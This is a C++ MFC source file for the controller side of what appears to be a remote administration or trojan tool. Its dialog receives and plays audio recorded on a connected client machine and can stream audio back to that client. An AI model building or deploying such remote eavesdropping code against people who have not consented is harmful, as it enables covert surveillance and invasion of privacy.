// AudioManagerDlg.cpp: 实现文件
//

#include "pch.h"
#include "Server.h"
#include "AudioManagerDlg.h"
#include "afxdialogex.h"


// CAudioManagerDlg 对话框

IMPLEMENT_DYNAMIC(CAudioManagerDlg, CDialog)


CAudioManagerDlg::CAudioManagerDlg(CWnd* pParent, _CIOCPServer* ClientObject, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_AUDIO_MANAGER, pParent)

{
	m_IsLoop = TRUE;
	m_ClientObject = ClientObject;
	m_ContextObject = ContextObject;
	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CAudioManagerDlg::~CAudioManagerDlg()
{
	m_IsLoop = FALSE;

	WaitForSingleObject(m_ThreadHandle, IDR_MAINFRAME);
	if (m_ThreadHandle != NULL)
	{
		CloseHandle(m_ThreadHandle);
		m_ThreadHandle = NULL;
	}
}



void CAudioManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CHECK_DIALOG_AUDIO_MANAGER_TO_CLIENT, m_Check_Dialog_Audio_Manager_To_Client);
}


BEGIN_MESSAGE_MAP(CAudioManagerDlg, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()



BOOL CAudioManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_IconHwnd, FALSE);
	//获得客户端IP
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("%s - 远程音频管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);



	//回传客户端
	BYTE IsToken = CLIENT_GO_ON;
	m_ClientObject->OnClientPreSending(m_ContextObject, &IsToken, sizeof(BYTE));

	//启动一个线程	
	m_ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProcedure, (LPVOID)this, 0, NULL);

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}
// CAudioManagerDlg 消息处理程序
void CAudioManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		m_ContextObject->DlgHandle = NULL;
		m_ContextObject->DlgID = 0;
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
	}
	CDialog::OnClose();
}

void CAudioManagerDlg::OnReceiveComplete(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}

	switch (m_ContextObject->m_InDeCompressedBufferData.GetArray(0)[0])
	{
	case CLIENT_AUDIO_MANAGER_RECORD_DATA:
	{
		m_Audio.PlayRecordData(m_ContextObject->m_InDeCompressedBufferData.GetArray(1),
			m_ContextObject->m_InDeCompressedBufferData.GetArrayLength() - 1);   //播放波形数据
		break;
	}
	default:
		// 传输发生异常数据
		break;
	}
}

DWORD CAudioManagerDlg::ThreadProcedure(LPVOID ParameterData)
{
	CAudioManagerDlg* This = (CAudioManagerDlg*)ParameterData;

	while (This->m_IsLoop)
	{
		if (This->m_Check_Dialog_Audio_Manager_To_Client.GetCheck() != 1)
		{
			Sleep(1);

			continue;
		}
		//将服务端数据发送到客户端
		DWORD	BufferLength = 0;
		LPBYTE	BufferData = This->m_Audio.GetRecordData(&BufferLength);   //播放声音

		if (BufferData != NULL && BufferLength > 0)
		{
			This->m_ClientObject->OnClientPreSending(This->m_ContextObject, BufferData, BufferLength); //没有消息头
		}

	}
	return 0;
}